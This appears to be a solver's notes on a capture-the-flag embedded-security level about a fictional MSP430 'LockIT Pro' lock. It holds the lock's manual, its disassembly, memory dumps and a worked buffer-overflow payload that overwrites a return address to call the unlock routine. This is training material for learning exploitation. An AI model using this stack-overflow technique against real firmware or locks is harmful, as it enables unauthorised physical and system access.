OVERVIEW

    - We have fixed issues with passwords which may be too long.
    - This lock is attached the the LockIT Pro HSM-1.


DETAILS

    The LockIT Pro b.02  is the first of a new series  of locks. It is
    controlled by a  MSP430 microcontroller, and is  the most advanced
    MCU-controlled lock available on the  market. The MSP430 is a very
    low-power device which allows the LockIT  Pro to run in almost any
    environment.

    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
    be inaccessable from the exterior of the building.

    There  is no  default  password  on the  LockIT  Pro HSM-1.   Upon
    receiving the  LockIT Pro,  a new  password must  be set  by first
    connecting the LockitPRO HSM to  output port two, connecting it to
    the LockIT Pro App, and entering a new password when prompted, and
    then restarting the LockIT Pro using the red button on the back.
    
    LockIT Pro Hardware  Security Module 1 stores  the login password,
    ensuring users  can not access  the password through  other means.
    The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the
    HSM will  return if the password  is correct by setting  a flag in
    memory.
    
    This is Hardware  Version B.  It contains  the Bluetooth connector
    built in, and two available  ports: the LockIT Pro Deadbolt should
    be  connected to  port  1,  and the  LockIT  Pro  HSM-1 should  be
    connected to port 2.

    This is Software Revision 02. We have improved the security of the
    lock by  removing a conditional  flag that could  accidentally get
    set by passwords that were too long.

--------------------------------

0010 <__trap_interrupt>
0010:  3041           ret
4400 <__init_stack>
4400:  3140 0044      mov	#0x4400, sp
4404 <__low_level_init>
4404:  1542 5c01      mov	&0x015c, r5
4408:  75f3           and.b	#-0x1, r5
440a:  35d0 085a      bis	#0x5a08, r5
440e <__do_copy_data>
440e:  3f40 0000      clr	r15
4412:  0f93           tst	r15
4414:  0724           jz	$+0x10 <__do_clear_bss+0x0>
4416:  8245 5c01      mov	r5, &0x015c
441a:  2f83           decd	r15
441c:  9f4f d445 0024 mov	0x45d4(r15), 0x2400(r15)
4422:  f923           jnz	$-0xc <__do_copy_data+0x8>
4424 <__do_clear_bss>
4424:  3f40 0000      clr	r15
4428:  0f93           tst	r15
442a:  0624           jz	$+0xe <main+0x0>
442c:  8245 5c01      mov	r5, &0x015c
4430:  1f83           dec	r15
4432:  cf43 0024      mov.b	#0x0, 0x2400(r15)
4436:  fa23           jnz	$-0xa <__do_clear_bss+0x8>
4438 <main>
4438:  b012 0045      call	#0x4500 <login>
443c <__stop_progExec__>
443c:  32d0 f000      bis	#0xf0, sr
4440:  fd3f           jmp	$-0x4 <__stop_progExec__+0x0>
4442 <__ctors_end>
4442:  3040 d245      br	#0x45d2 <_unexpected_>
4446 <unlock_door>
4446:  3012 7f00      push	#0x7f
444a:  b012 4245      call	#0x4542 <INT>
444e:  2153           incd	sp
4450:  3041           ret
4452 <test_password_valid>
4452:  0412           push	r4
4454:  0441           mov	sp, r4
4456:  2453           incd	r4
4458:  2183           decd	sp
445a:  c443 fcff      mov.b	#0x0, -0x4(r4)
445e:  3e40 fcff      mov	#0xfffc, r14
4462:  0e54           add	r4, r14
4464:  0e12           push	r14
4466:  0f12           push	r15
4468:  3012 7d00      push	#0x7d
446c:  b012 4245      call	#0x4542 <INT>
4470:  5f44 fcff      mov.b	-0x4(r4), r15
4474:  8f11           sxt	r15
4476:  3152           add	#0x8, sp
4478:  3441           pop	r4
447a:  3041           ret
447c .strings:
447c: "Enter the password to continue."
449c: "Remember: passwords are between 8 and 16 characters."
44d1: "Access granted."
44e1: "That password is not correct."
44ff: ""
4500 <login>
4500:  3150 f0ff      add	#0xfff0, sp
4504:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
4508:  b012 a645      call	#0x45a6 <puts>
450c:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4510:  b012 a645      call	#0x45a6 <puts>
4514:  3e40 3000      mov	#0x30, r14
4518:  0f41           mov	sp, r15
451a:  b012 9645      call	#0x4596 <getsn>
451e:  0f41           mov	sp, r15
4520:  b012 5244      call	#0x4452 <test_password_valid>
4524:  0f93           tst	r15
4526:  0524           jz	$+0xc <login+0x32>
4528:  b012 4644      call	#0x4446 <unlock_door>
452c:  3f40 d144      mov	#0x44d1 "Access granted.", r15
4530:  023c           jmp	$+0x6 <login+0x36>
4532:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4536:  b012 a645      call	#0x45a6 <puts>
453a:  3150 1000      add	#0x10, sp
453e:  3041           ret
4540 <__do_nothing>
4540:  3041           ret
4542 <INT>
4542:  1e41 0200      mov	0x2(sp), r14
4546:  0212           push	sr
4548:  0f4e           mov	r14, r15
454a:  8f10           swpb	r15
454c:  024f           mov	r15, sr
454e:  32d0 0080      bis	#0x8000, sr
4552:  b012 1000      call	#0x10
4556:  3241           pop	sr
4558:  3041           ret
455a <putchar>
455a:  2183           decd	sp
455c:  0f12           push	r15
455e:  0312           push	#0x0
4560:  814f 0400      mov	r15, 0x4(sp)
4564:  b012 4245      call	#0x4542 <INT>
4568:  1f41 0400      mov	0x4(sp), r15
456c:  3150 0600      add	#0x6, sp
4570:  3041           ret
4572 <getchar>
4572:  0412           push	r4
4574:  0441           mov	sp, r4
4576:  2453           incd	r4
4578:  2183           decd	sp
457a:  3f40 fcff      mov	#0xfffc, r15
457e:  0f54           add	r4, r15
4580:  0f12           push	r15
4582:  1312           push	#0x1
4584:  b012 4245      call	#0x4542 <INT>
4588:  5f44 fcff      mov.b	-0x4(r4), r15
458c:  8f11           sxt	r15
458e:  3150 0600      add	#0x6, sp
4592:  3441           pop	r4
4594:  3041           ret
4596 <getsn>
4596:  0e12           push	r14
4598:  0f12           push	r15
459a:  2312           push	#0x2
459c:  b012 4245      call	#0x4542 <INT>
45a0:  3150 0600      add	#0x6, sp
45a4:  3041           ret
45a6 <puts>
45a6:  0b12           push	r11
45a8:  0b4f           mov	r15, r11
45aa:  073c           jmp	$+0x10 <puts+0x14>
45ac:  1b53           inc	r11
45ae:  8f11           sxt	r15
45b0:  0f12           push	r15
45b2:  0312           push	#0x0
45b4:  b012 4245      call	#0x4542 <INT>
45b8:  2152           add	#0x4, sp
45ba:  6f4b           mov.b	@r11, r15
45bc:  4f93           tst.b	r15
45be:  f623           jnz	$-0x12 <puts+0x6>
45c0:  3012 0a00      push	#0xa
45c4:  0312           push	#0x0
45c6:  b012 4245      call	#0x4542 <INT>
45ca:  2152           add	#0x4, sp
45cc:  0f43           clr	r15
45ce:  3b41           pop	r11
45d0:  3041           ret
45d2 <_unexpected_>
45d2:  0013           reti	pc

--------------------------------

the
interrupt 0x7D will pass a given password to the HSM, and will set a byte in
memory if the password entered matches the stored password.

The stored password can be reset by detaching the HSM from the lock and
attaching it to the Model 1 reset device, also included.

 The interrupt kind
is passed in R2, the status register, on the high byte. Arguments are passed
on the stack

The door lock must be attached to output pin 7 of the MCU.
This enables the CPU to trigger software interrupt 0x7F

450c:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4510:  b012 a645      call	#0x45a6 <puts>
4514:  3e40 3000      mov	#0x30, r14

primitives:
password is said to be 8-16 chars long but buffer is 48 bytes

test input 00112233445566778899aabbccddeeff

input can overwrite memory

input is stored at 0x43ee

memory from 43ee:
                                         43ee
43e0: 7044 7d00 ee43 e843 0043 0000 2445 aaaa   pD}..C.C.C..$E..
43f0: aaaa 0000 0000 0000 0000 0000 0000 3c44   ..............<D
4400: 3140 0044 1542 5c01 75f3 35d0 085a 3f40   1@.D.B\.u.5..Z?@
4410: 0000 0f93 0724 8245 5c01 2f83 9f4f d445   .....$.E\./..O.E
4420: 0024 f923 3f40 0000 0f93 0624 8245 5c01   .$.#?@.....$.E\.
4430: 1f83 cf43 0024 fa23 b012 0045 32d0 f000   ...C.$.#...E2...
4440: fd3f 3040 d245 3012 7f00 b012 4245 2153   .?0@.E0....BE!S
4450: 3041 0412 0441 2453 2183 c443 fcff 3e40   0A...A$S!..C..>@
4460: fcff 0e54 0e12 0f12 3012 7d00 b012 4245   ...T....0.}...BE
4470: 5f44 fcff 8f11 3152 3441 3041 456e 7465   _D....1R4A0AEnte
4480: 7220 7468 6520 7061 7373 776f 7264 2074   r the password t
4490: 6f20 636f 6e74 696e 7565 2e00 5265 6d65   o continue..Reme
44a0: 6d62 6572 3a20 7061 7373 776f 7264 7320   mber: passwords 
44b0: 6172 6520 6265 7477 6565 6e20 3820 616e   are between 8 an
44c0: 6420 3136 2063 6861 7261 6374 6572 732e   d 16 characters.
44d0: 0041 6363 6573 7320 6772 616e 7465 642e   .Access granted.
44e0: 0054 6861 7420 7061 7373 776f 7264 2069   .That password i
44f0: 7320 6e6f 7420 636f 7272 6563 742e 0000   s not correct...
4500: 3150 f0ff 3f40 7c44 b012 a645 3f40 9c44   1P..?@|D...E?@.D
4510: b012 a645 3e40 3000 0f41 b012 9645 0f41   ...E>@0..A...E.A
4520: b012 5244 0f93 0524 b012 4644 3f40 d144   ..RD...$..FD?@.D
4530: 023c 3f40 e144 b012 a645 3150 1000 3041   .<?@.D...E1P..0A
           ^jumps here if input is incorrect
                     ^this gets executed after incorrect input

what i want to be executed:
call #0x4446
b0124644
(calls unclock door)

but i can only overwrite 48 bytes

i can play with this:
4400: 3140 0044 1542 5c01 75f3 35d0 085a 3f40
4410: 0000 0f93 0724 8245 5c01 2f83 9f4f d445

3140004415425c0175f335d0085a3f4000000f93072482455c012f839f4fd445
3140 0044      mov	#0x4400, sp
1542 5c01      mov	&0x015c, r5
75f3           and.b	#-0x1, r5
35d0 085a      bis	#0x5a08, r5
3f40 0000      clr	r15
0f93           tst	r15
0724           jz	$+0x10
8245 5c01      mov	r5, &0x015c
2f83           decd	r15

i can overwrite <__init_stack> <__low_level_init> and <__do_copy_data>

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4644

looking at the stack while trying to figure out a way to execute my code ive realized that i can overwrite a call address
Just put 0x4446 there (unlock lock)







